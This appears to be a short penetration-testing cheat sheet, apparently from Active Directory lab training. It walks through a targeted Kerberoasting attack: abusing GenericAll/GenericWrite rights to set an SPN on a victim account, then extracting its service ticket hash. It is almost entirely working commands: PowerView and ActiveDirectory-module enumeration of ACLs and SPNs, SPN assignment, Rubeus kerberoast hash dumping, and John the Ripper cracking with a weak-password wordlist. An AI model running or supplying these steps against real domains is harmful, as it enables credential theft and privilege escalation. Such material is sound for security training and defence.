
* With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the domain).
* We can then request a TGS without special privileges. The TGS can then be "Kerberoasted".

* Let's enumerate the permissions for RDPUsers on ACLs using PowerView:
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

* Using Powerview, see if the user already has a SPN:
```
Get-DomainUser -Identity supportuser | select serviceprincipalname
```

* Using ActiveDirectory module:
```
Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName
```

* Set a SPN for the user (must be unique for the forest)
```
Set-DomainObject -Identity support1user -Set @{serviceprincipalname=‘dcorp/whatever1'}
```

• Using ActiveDirectory module:
```
Set-ADUser -Identity support1user -ServicePrincipalNames @{Add=‘dcorp/whatever1'}
```

* Kerberoast the user :
```
Rubeus.exe kerberoast /outfile:targetedhashes.txt 
```

```
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt
```

